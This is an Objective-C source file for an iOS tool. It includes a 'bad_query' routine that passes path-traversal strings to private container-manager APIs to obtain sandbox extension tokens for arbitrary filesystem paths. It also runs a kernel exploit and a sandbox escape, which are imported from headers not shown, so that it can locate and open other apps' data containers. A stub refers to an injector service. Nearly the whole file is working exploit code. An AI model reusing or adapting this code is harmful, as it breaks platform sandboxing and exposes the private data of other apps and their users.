#import "DavizinMCM.h"
#import "kexploit/kexploit_opa334.h"
#import "kexploit/sandbox_escape.h"
#import "kexploit/kutils.h"
#import <Foundation/Foundation.h>
#import <stdio.h>
#import <stdlib.h>
#import <dlfcn.h>
#import <errno.h>
#import <string.h>
#import <sys/stat.h>
#import <xpc/xpc.h>

// MARK: - bad_query inlined from https://github.com/tajc/bad_query

typedef void *(*cm_query_create_fn)(void);
typedef void (*cm_query_set_class_fn)(void *, uint64_t);
typedef void (*cm_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*cm_query_set_flags_fn)(void *, uint64_t);
typedef void (*cm_query_set_part_fn)(void *, uint64_t);
typedef void (*cm_query_set_part_domain_fn)(void *, const char *);
typedef void *(*cm_query_single_fn)(void *);
typedef void (*cm_query_free_fn)(void *);
typedef char *(*cm_copy_token_fn)(void *);
typedef int64_t (*sb_consume_fn)(const char *);
typedef int (*sb_release_fn)(int64_t);

static int64_t bad_query_impl(const char* path, bool create, const char *group_identifier, bool is_group) {
    if (!path || path[0] != '/') return -255;
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) return -254;
    }

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    cm_query_create_fn query_create = (cm_query_create_fn)dlsym(mgr, "container_query_create");
    cm_query_set_class_fn query_set_class = (cm_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    cm_query_set_identifiers_fn query_set_group_identifiers = (cm_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    cm_query_set_flags_fn query_set_flags = (cm_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    cm_query_set_part_fn query_set_part = (cm_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    cm_query_set_part_domain_fn query_set_part_domain = (cm_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    cm_query_single_fn query_get_single_result = (cm_query_single_fn)dlsym(mgr, "container_query_get_single_result");
    cm_query_free_fn query_free = (cm_query_free_fn)dlsym(mgr, "container_query_free");
    cm_copy_token_fn copy_sandbox_token = (cm_copy_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sb_consume_fn consume_extension = (sb_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    int64_t handle = -1;
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags ||
        !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free ||
        !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -1;
    }

    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -2;
    }

    xpc_object_t identifier;
    if (group_identifier == NULL) {
        query_set_class(query, 13); // SystemGroup
        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    } else {
        query_set_class(query, 7); // AppGroup
        identifier = xpc_string_create(group_identifier);
    }
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);

    char *part = NULL;
    if (group_identifier == NULL) {
        if (asprintf(&part, "../../../../../../../..%s", path) != -1) {
            query_set_part_domain(query, part);
        } else {
            xpc_release(identifier);
            query_free(query);
            dlclose(mgr);
            return -5;
        }
    } else {
        if (asprintf(&part, "../../../../../../../../..%s", path) != -1) {
            query_set_part_domain(query, part);
        } else {
            xpc_release(identifier);
            query_free(query);
            dlclose(mgr);
            return -5;
        }
    }

    if (is_group) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }

    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -3;
    }

    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -4;
    }

    handle = consume_extension(token);
    free(token);
    free(part);
    xpc_release(identifier);
    query_free(query);
    dlclose(mgr);
    return handle;
}

static void bad_query_release_impl(int64_t handle) {
    if (handle < 0) return;
    sb_release_fn release_extension = (sb_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}

// MARK: - Davizin MCM

static NSString *gDavizinMCMLastDiagnostic;
static int64_t gLastContainerHandle = -1;

NSString *DavizinMCMLastDiagnostic(void) {
    return gDavizinMCMLastDiagnostic;
}

static void DavizinMCMLog(NSString *message) {
    gDavizinMCMLastDiagnostic = message;
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    NSArray<NSString *> *existing = [defaults stringArrayForKey:@"nyxel.activity.log"] ?: @[];
    NSDateFormatter *formatter = [NSDateFormatter new];
    formatter.dateFormat = @"HH:mm";
    NSString *entry = [NSString stringWithFormat:@"%@  %@", [formatter stringFromDate:[NSDate date]], message];
    NSMutableArray<NSString *> *values = [NSMutableArray arrayWithObject:entry];
    [values addObjectsFromArray:existing];
    if (values.count > 6) [values removeObjectsInRange:NSMakeRange(6, values.count - 6)];
    [defaults setObject:values forKey:@"nyxel.activity.log"];
}

static NSString *findContainerByBundleID(NSString *rootPath, NSString *bundleID) {
    NSArray *contents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:rootPath error:nil];
    for (NSString *uuid in contents) {
        if ([[NSUUID alloc] initWithUUIDString:uuid] == nil) continue;
        NSString *containerPath = [rootPath stringByAppendingPathComponent:uuid];
        NSString *metadataPath = [containerPath stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];

        NSData *data = [NSData dataWithContentsOfFile:metadataPath];
        if (!data) continue;

        NSDictionary *plist = [NSPropertyListSerialization propertyListWithData:data options:0 format:NULL error:nil];
        if (![plist isKindOfClass:[NSDictionary class]]) continue;

        NSString *containerBundleID = plist[@"MCMMetadataIdentifier"];
        if ([containerBundleID isEqualToString:bundleID]) {
            return containerPath;
        }
    }
    return nil;
}

// Stub for backward compatibility with InjectorService
NSString *DavizinPrepareInjectionQuery(NSString *bundleID, NSString **outErr) {
    return nil;
}

static BOOL gExploitAttempted = NO;
static BOOL gExploitSucceeded = NO;

static BOOL ensureSandboxEscape(void) {
    if (sandbox_access_is_active() == 1) {
        DavizinMCMLog(@"sandbox: ya escapeado");
        return YES;
    }

    if (gExploitAttempted) {
        return gExploitSucceeded;
    }
    gExploitAttempted = YES;

    DavizinMCMLog(@"kexploit: iniciando (10-30s, iOS 27 puede no ser soportado)...");
    int ret = kexploit_opa334();
    if (ret != 0) {
        DavizinMCMLog([NSString stringWithFormat:@"kexploit: no soportado (ret=%d), continuando sin escape...", ret]);
        gExploitSucceeded = YES; // Continue anyway - bad_query might still work
        return YES;
    }

    uint64_t selfProc = proc_self();
    if (selfProc == 0) {
        DavizinMCMLog(@"kexploit: proc_self=0, continuando...");
        gExploitSucceeded = YES;
        return YES;
    }

    int sbxRet = sandbox_escape(selfProc);
    int active = sandbox_access_is_active();
    gExploitSucceeded = (sbxRet == 0 && active == 1);

    DavizinMCMLog([NSString stringWithFormat:@"kexploit: escape ret=%d active=%d", sbxRet, active]);
    return YES; // Always continue to bad_query
}

NSString *DavizinGetContainerPath(NSString *bundleID, NSString **outErr) {
    if (gLastContainerHandle >= 0) {
        bad_query_release_impl(gLastContainerHandle);
        gLastContainerHandle = -1;
    }

    // Run kernel exploit + sandbox escape first (iOS 26+)
    // Even if it fails, bad_query will try anyway
    ensureSandboxEscape();

    NSString *appDataRoot = @"/var/mobile/Containers/Data/Application";

    int64_t rootHandle = bad_query_impl(appDataRoot.UTF8String, true, NULL, false);

    NSString *foundPath = findContainerByBundleID(appDataRoot, bundleID);

    if (rootHandle >= 0) {
        bad_query_release_impl(rootHandle);
    }

    if (!foundPath) {
        if (outErr) *outErr = [NSString stringWithFormat:@"No encontrado '%@' root_handle=%lld", bundleID, rootHandle];
        DavizinMCMLog([NSString stringWithFormat:@"MCM %@: no encontrado root=%lld", bundleID, rootHandle]);
        return nil;
    }

    gLastContainerHandle = bad_query_impl(foundPath.UTF8String, true, NULL, false);

    DavizinMCMLog([NSString stringWithFormat:@"MCM %@: path=%@ handle=%lld",
                   bundleID, foundPath.lastPathComponent, gLastContainerHandle]);

    if (gLastContainerHandle < 0) {
        if (outErr) *outErr = [NSString stringWithFormat:@"bad_query failed handle=%lld", gLastContainerHandle];
    }

    return foundPath;
}
